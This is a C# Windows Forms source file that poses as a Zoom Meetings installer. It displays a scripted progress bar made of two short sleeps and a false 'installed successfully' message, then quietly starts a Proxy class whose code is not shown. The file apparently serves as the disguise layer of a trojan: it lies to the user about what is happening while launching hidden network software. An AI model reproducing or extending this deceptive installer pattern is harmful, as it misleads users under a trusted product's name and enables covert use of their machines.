using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;

namespace zoomed
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            runProgress();
        }

        private void runProgress()
        {
            label_informative.Text = "Installing this can take a while...";
            if (backgroundWorker.IsBusy != true)
            {
                backgroundWorker.RunWorkerAsync();
            }

        }

        private void backgroundWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            for(int i = 1; i <= 2; i++)
            {
                Thread.Sleep(500);
                backgroundWorker.ReportProgress(i * 50);
            }


        }

        private void backgroundWorker_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            progressBar1.Value = e.ProgressPercentage;
        }

        private void backgroundWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            label_informative.Text = "zoom meetings installed successfully";
            //MessageBox.Show("Se termino");

            Proxy proxy = new Proxy();
            proxy.startProxy(); 
        }
    }
}
